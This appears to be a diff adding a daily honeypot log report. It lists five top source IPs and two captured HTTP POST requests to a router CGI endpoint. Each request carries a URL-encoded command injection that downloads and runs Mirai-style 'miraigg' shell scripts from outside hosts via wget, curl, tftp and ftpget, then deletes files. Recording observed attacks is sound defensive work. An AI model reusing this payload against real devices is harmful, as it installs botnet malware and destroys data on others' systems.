@@ -1,0 +1,33 @@
+Top 5 IPs for 29-09-2024 :
+
+188.166.59.144
+24.188.9.179
+116.48.154.172
+81.166.142.226
+207.102.185.82
+
+
+Malware Observed:
+
+None
+
+Commands/exploits observed :
+
+POST /cgi-bin/mft/wireless_mft HTTP/1.1
+Host: <Host Ip>
+User-Agent: Go-http-client/1.1
+Content-Length: 684
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+ap=ap%3D%24%28wget+http%3A%2F%2F193.111.248.148%3A5005%2F+-O+%2Ftmp%2Ffile%3B+curl+http%3A%2F%2F193.111.248.148%3A5005%2F%3B+cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2F93.123.85.221%2Fmiraigg.sh%3B+curl+-O+http%3A%2F%2F93.123.85.221%2Fmiraigg.sh%3B+chmod+777+miraigg.sh%3B+sh+miraigg.sh%3B+tftp+93.123.85.221+-c+get+miraigg.sh%3B+chmod+777+miraigg.sh%3B+sh+miraigg.sh%3B+tftp+-r+miraigg2.sh+-g+93.123.85.221%3B+chmod+777+miraigg2.sh%3B+sh+miraigg2.sh%3B+ftpget+-v+-u+anonymous+-p+anonymous+-P+21+93.123.85.221+miraigg1.sh+miraigg1.sh%3B+sh+miraigg1.sh%3B+rm+-rf+miraigg.sh+miraigg.sh+miraigg2.sh+miraigg1.sh%3B+rm+-rf+%2A%29
+
+
+POST /cgi-bin/mft/wireless_mft HTTP/1.1
+Host: <Host Ip>
+User-Agent: Go-http-client/1.1
+Content-Length: 684
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+ap=ap%3D%24%28wget+http%3A%2F%2F193.111.248.148%3A5005%2F+-O+%2Ftmp%2Ffile%3B+curl+http%3A%2F%2F193.111.248.148%3A5005%2F%3B+cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2F93.123.85.221%2Fmiraigg.sh%3B+curl+-O+http%3A%2F%2F93.123.85.221%2Fmiraigg.sh%3B+chmod+777+miraigg.sh%3B+sh+miraigg.sh%3B+tftp+93.123.85.221+-c+get+miraigg.sh%3B+chmod+777+miraigg.sh%3B+sh+miraigg.sh%3B+tftp+-r+miraigg2.sh+-g+93.123.85.221%3B+chmod+777+miraigg2.sh%3B+sh+miraigg2.sh%3B+ftpget+-v+-u+anonymous+-p+anonymous+-P+21+93.123.85.221+miraigg1.sh+miraigg1.sh%3B+sh+miraigg1.sh%3B+rm+-rf+miraigg.sh+miraigg.sh+miraigg2.sh+miraigg1.sh%3B+rm+-rf+%2A%29
